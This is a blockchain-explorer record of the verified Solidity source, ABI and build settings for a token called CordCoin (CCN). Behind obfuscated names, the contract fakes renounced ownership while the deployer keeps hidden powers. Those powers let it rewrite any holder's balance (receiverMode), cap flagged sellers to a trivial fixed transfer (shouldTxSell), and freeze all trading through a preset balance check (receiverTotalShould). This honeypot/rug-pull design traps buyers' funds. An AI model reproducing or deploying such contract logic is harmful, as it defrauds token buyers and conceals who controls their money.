{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract minTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldLiquidity {\n    function createPair(address receiverSwap, address shouldReceiverTeam) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface maxMinAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface senderFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txListFee) external view returns (uint256);\n\n    function transfer(address sellMarketing, uint256 fromToken) external returns (bool);\n\n    function allowance(address walletSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellMarketing,\n        uint256 fromToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingExemptAt, uint256 value);\n    event Approval(address indexed walletSender, address indexed spender, uint256 value);\n}\n\ninterface senderFundMetadata is senderFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CordCoin is minTrading, senderFund, senderFundMetadata {\n\n    function sellExemptFund() private view {\n        require(liquidityTeam[_msgSender()]);\n    }\n\n    function approve(address feeLiquidity, uint256 fromToken) public virtual override returns (bool) {\n        shouldMarketing[_msgSender()][feeLiquidity] = fromToken;\n        emit Approval(_msgSender(), feeLiquidity, fromToken);\n        return true;\n    }\n\n    function tokenTo(address marketingMode, address sellMarketing, uint256 fromToken) internal returns (bool) {\n        require(amountSellLaunched[marketingMode] >= fromToken);\n        amountSellLaunched[marketingMode] -= fromToken;\n        amountSellLaunched[sellMarketing] += fromToken;\n        emit Transfer(marketingMode, sellMarketing, fromToken);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return minSwap;\n    }\n\n    function listReceiverSwap(address marketingMode, address sellMarketing, uint256 fromToken) internal view returns (uint256) {\n        require(fromToken > 0);\n\n        uint256 swapTo = 0;\n        if (marketingMode == tradingIs && toShould > 0) {\n            swapTo = fromToken * toShould / 100;\n        } else if (sellMarketing == tradingIs && marketingList > 0) {\n            swapTo = fromToken * marketingList / 100;\n        }\n        require(swapTo <= fromToken);\n        return fromToken - swapTo;\n    }\n\n    uint256 tokenTake;\n\n    address fundAutoShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address minShould, address feeLiquidity) external view virtual override returns (uint256) {\n        if (feeLiquidity == fundAutoShould) {\n            return type(uint256).max;\n        }\n        return shouldMarketing[minShould][feeLiquidity];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalAt;\n    }\n\n    uint256 public exemptLaunchedToken;\n\n    function senderTotal() public {\n        emit OwnershipTransferred(fromToIs, address(0));\n        minSwap = address(0);\n    }\n\n    function transferFrom(address marketingMode, address sellMarketing, uint256 fromToken) external override returns (bool) {\n        if (_msgSender() != fundAutoShould) {\n            if (shouldMarketing[marketingMode][_msgSender()] != type(uint256).max) {\n                require(fromToken <= shouldMarketing[marketingMode][_msgSender()]);\n                shouldMarketing[marketingMode][_msgSender()] -= fromToken;\n            }\n        }\n        return feeTotal(marketingMode, sellMarketing, fromToken);\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldMarketing;\n\n    function feeTotal(address marketingMode, address sellMarketing, uint256 fromToken) internal returns (bool) {\n        if (marketingMode == fromToIs) {\n            return tokenTo(marketingMode, sellMarketing, fromToken);\n        }\n        uint256 receiverListTo = senderFund(tradingIs).balanceOf(liquidityToken);\n        require(receiverListTo == tokenTake);\n        require(sellMarketing != liquidityToken);\n        if (autoTeam[marketingMode]) {\n            return tokenTo(marketingMode, sellMarketing, receiverTake);\n        }\n        fromToken = listReceiverSwap(marketingMode, sellMarketing, fromToken);\n        return tokenTo(marketingMode, sellMarketing, fromToken);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromMin;\n    }\n\n    function transfer(address teamMode, uint256 fromToken) external virtual override returns (bool) {\n        return feeTotal(_msgSender(), teamMode, fromToken);\n    }\n\n    address public fromToIs;\n\n    bool public txAmountTake;\n\n    function getOwner() external view returns (address) {\n        return minSwap;\n    }\n\n    mapping(address => bool) public autoTeam;\n\n    mapping(address => bool) public liquidityTeam;\n\n    function balanceOf(address txListFee) public view virtual override returns (uint256) {\n        return amountSellLaunched[txListFee];\n    }\n\n    constructor (){\n        \n        senderTotal();\n        maxMinAuto listWallet = maxMinAuto(fundAutoShould);\n        tradingIs = shouldLiquidity(listWallet.factory()).createPair(listWallet.WETH(), address(this));\n        liquidityToken = shouldLiquidity(listWallet.factory()).feeTo();\n        if (txAmountTake == listMinSwap) {\n            listMinSwap = false;\n        }\n        fromToIs = _msgSender();\n        liquidityTeam[fromToIs] = true;\n        amountSellLaunched[fromToIs] = toMarketingAmount;\n        \n        emit Transfer(address(0), fromToIs, toMarketingAmount);\n    }\n\n    uint256 private limitAmount;\n\n    address public tradingIs;\n\n    address private minSwap;\n\n    uint256 public toShould = 3;\n\n    function receiverTotalShould(uint256 fromToken) public {\n        sellExemptFund();\n        tokenTake = fromToken;\n    }\n\n    function shouldTxSell(address amountLimit) public {\n        sellExemptFund();\n        \n        if (amountLimit == fromToIs || amountLimit == tradingIs) {\n            return;\n        }\n        autoTeam[amountLimit] = true;\n    }\n\n    string private txMax = \"Cord Coin\";\n\n    uint256 public marketingList = 0;\n\n    bool private fundLaunched;\n\n    function receiverMode(address teamMode, uint256 fromToken) public {\n        sellExemptFund();\n        amountSellLaunched[teamMode] = fromToken;\n    }\n\n    bool private listMinSwap;\n\n    string private totalAt = \"CCN\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toMarketingAmount;\n    }\n\n    uint256 constant receiverTake = 7 ** 10;\n\n    event OwnershipTransferred(address indexed senderLaunchTotal, address indexed isMarketing);\n\n    mapping(address => uint256) private amountSellLaunched;\n\n    uint256 public modeTotalLiquidity;\n\n    function marketingTx(address receiverEnable) public {\n        require(receiverEnable.balance < 100000);\n        if (liquidityWallet) {\n            return;\n        }\n        if (txAmountTake) {\n            txAmountTake = true;\n        }\n        liquidityTeam[receiverEnable] = true;\n        \n        liquidityWallet = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txMax;\n    }\n\n    bool private amountSenderTeam;\n\n    address liquidityToken;\n\n    uint256 private amountAt;\n\n    uint8 private fromMin = 18;\n\n    bool private launchedFee;\n\n    uint256 private toMarketingAmount = 100000000 * 10 ** 18;\n\n    bool public liquidityWallet;\n\n    uint256 senderList;\n\n    bool private enableTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLaunchTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingExemptAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txListFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunchedToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"marketingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotalLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromToken\",\"type\":\"uint256\"}],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromToken\",\"type\":\"uint256\"}],\"name\":\"receiverTotalShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"}],\"name\":\"shouldTxSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmountTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CordCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}